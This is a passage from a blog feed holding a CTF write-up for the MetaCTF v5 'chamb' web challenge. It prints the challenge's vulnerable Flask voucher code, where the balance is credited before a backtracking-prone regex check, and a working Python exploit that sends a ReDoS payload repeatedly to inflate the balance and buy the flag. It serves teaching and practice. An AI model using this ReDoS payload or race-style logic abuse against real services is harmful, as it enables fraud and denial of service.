        <span class="n">database</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_DB</span><span class="sh">'</span><span class="p">]</span>
    <span class="p">)</span>
<span class="k">def</span> <span class="nf">generate_random_voucher</span><span class="p">():</span>
    <span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span>
    <span class="n">digits</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
    <span class="n">voucher</span> <span class="o">=</span> <span class="sh">"</span><span class="s">zoz</span><span class="sh">"</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="sh">"</span><span class="s">-_.</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">characters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">)))</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="sh">"</span><span class="s">-_.</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">voucher</span> <span class="o">+=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">)))</span>
    <span class="k">return</span> <span class="n">voucher</span>

<span class="k">def</span> <span class="nf">generate_random_username</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">secrets</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">characters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        
        <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT first_time FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">),))</span>
        <span class="n">first_time</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT balance FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">),))</span>
        <span class="n">balance</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">first_time</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">voucher</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Your first time $100 voucher: </span><span class="si">{</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span><span class="n">balance</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">balance</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">balance</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">balance</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="nf">generate_random_username</span><span class="p">()</span>
    <span class="n">voucher</span> <span class="o">=</span> <span class="nf">generate_random_voucher</span><span class="p">()</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">voucher</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">INSERT INTO users (username) VALUES (%s)</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">voucher</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Your first time $100 voucher: </span><span class="si">{</span><span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span><span class="n">balance</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">$0</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">redeem_voucher_process</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT first_time FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
    <span class="n">first_time</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">first_time</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">You can redeem your voucher only once</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">return</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">"</span><span class="s">^zoz[-_.][a-zA-Z0-9]{3,5}[-_.](\d+)+$</span><span class="sh">"</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET balance = balance + 100 WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">hereee</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">voucher</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">voucher</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Voucher matched</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET first_time = 1 WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
            <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">Voucher redeemed, please refresh the page to view your balance</span><span class="sh">"</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET balance = balance - 100 WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
            <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">Invalid voucher</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">400</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/redeem_voucher</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">redeem_voucher</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">User not logged in please refresh the page</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>

    <span class="n">voucher</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">voucher</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">voucher</span><span class="p">:</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Voucher not provided</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>

    <span class="n">result</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="nc">Manager</span><span class="p">().</span><span class="nf">dict</span><span class="p">()</span>
    <span class="n">process</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">redeem_voucher_process</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">voucher</span><span class="p">,</span> <span class="n">result</span><span class="p">))</span>
    <span class="n">process</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

    <span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span>  
    <span class="n">process</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">process</span><span class="p">.</span><span class="nf">is_alive</span><span class="p">():</span>
        <span class="n">process</span><span class="p">.</span><span class="nf">terminate</span><span class="p">()</span>
        <span class="n">process</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
        <span class="k">return</span> <span class="sh">"</span><span class="s">Something Went wrong</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>

    <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">result</span><span class="p">[</span><span class="sh">'</span><span class="s">response</span><span class="sh">'</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/buy_product</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">buy_product</span><span class="p">():</span>
    <span class="n">products</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">Drill</span><span class="sh">'</span><span class="p">:</span> <span class="mi">75</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Pliers</span><span class="sh">'</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Wrench</span><span class="sh">'</span><span class="p">:</span> <span class="mi">30</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Hard hat</span><span class="sh">'</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Screwdriver</span><span class="sh">'</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Paintbrush</span><span class="sh">'</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Hammer</span><span class="sh">'</span><span class="p">:</span> <span class="mi">25</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">Flag</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1337</span>  
    <span class="p">}</span>

    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">User not logged in</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">401</span>

    <span class="n">product_name</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">product</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">product_name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">products</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Product not found</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span>

    <span class="n">product_price</span> <span class="o">=</span> <span class="n">products</span><span class="p">[</span><span class="n">product_name</span><span class="p">]</span>

    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>

    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT balance FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
    <span class="n">current_balance</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">current_balance</span> <span class="o">&lt;</span> <span class="n">product_price</span><span class="p">:</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Insufficient balance</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="n">new_balance</span> <span class="o">=</span> <span class="n">current_balance</span> <span class="o">-</span> <span class="n">product_price</span>

    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET balance = %s WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">new_balance</span><span class="p">,</span> <span class="n">username</span><span class="p">))</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>

    <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">product_name</span> <span class="o">==</span> <span class="sh">"</span><span class="s">Flag</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
            <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Wow how do you have so much money here is your flag: </span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">FLAG</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>
        <span class="p">}),</span> <span class="mi">200</span>

    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
        <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Successfully purchased </span><span class="si">{</span><span class="n">product_name</span><span class="si">}</span><span class="s">. Remaining balance: </span><span class="si">{</span><span class="n">new_balance</span><span class="si">}</span><span class="s">, We will ship to you as fast as possible :)</span><span class="sh">"</span>
    <span class="p">}),</span> <span class="mi">200</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/css/&lt;path:filename&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">serve_css</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">assets</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">css</span><span class="sh">'</span><span class="p">),</span> <span class="n">filename</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/js/&lt;path:filename&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">serve_js</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">assets</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">js</span><span class="sh">'</span><span class="p">),</span> <span class="n">filename</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/images/&lt;path:filename&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">serve_images</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">assets</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">images</span><span class="sh">'</span><span class="p">),</span> <span class="n">filename</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

</code></pre></div></div>

<p>Notice that the check of our voucher uses multithread which is weird and dangerous, I thought it would be a race condition because of the threading being used there but I was wrong after a lot of try-and-fail, using race condition we can only consume the same or any two vouchers only twice i.e we can get the balance of 200 only.</p>

<p>At this point I wasn’t aware of the hint and had no ideas to try it out, the CTF was over and I couldn’t solve the challenge. The next day after the CTF in the morning I rechecked the website and noticed that I had many notifications in the platform, the last one was that a new hint was added to chamb challenge, felt despair a bit and continued to the challenge to see the hint. Now it mentioned regex and we know about multithreading, the first thing that came to my mind was to check for ReDos in <a href="https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos">Hacktricks</a> interestingly there was a clone and use tool for the job <a href="https://github.com/doyensec/regexploit">regexploit</a> after giving it the regex that was used in the website we got a ReDos possible input.</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-chamb-01.png" alt="metactfv5-chamb-01" /></p>

<p>Using this output I made the following exploit to get an infinite balance to buy the flag 👌+🏴= 🙂</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://f52668c3-8361-4727-8634-ad0a85fec4ac.cscpsut.com/</span><span class="sh">"</span>
<span class="n">buy_flag</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/buy_product?product=Flag</span><span class="sh">"</span>
<span class="n">redeem_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/redeem_voucher</span><span class="sh">"</span>


<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">]</span>
<span class="n">voucher</span> <span class="o">=</span> <span class="sh">"</span><span class="s">zoz-000-</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">3456</span> <span class="o">+</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
        <span class="n">redeem_url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">:</span> <span class="n">session</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">voucher</span><span class="sh">"</span><span class="p">:</span> <span class="n">voucher</span><span class="p">}</span>
    <span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Attempt </span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">()</span>
<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">buy_flag</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">:</span> <span class="n">session</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

</code></pre></div></div>

<p><img src="/assets/images/metactf-writeups/metactfv5-chamb-02.png" alt="metactfv5-chamb-02" /></p>

<p>Hope you enjoyed and learned a lot while reading this 🙂</p>]]></content><author><name>Ahmad Abuzaid</name><email>iiahmad435@gmail.com</email></author><summary type="html"><![CDATA[Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.]]></summary></entry></feed>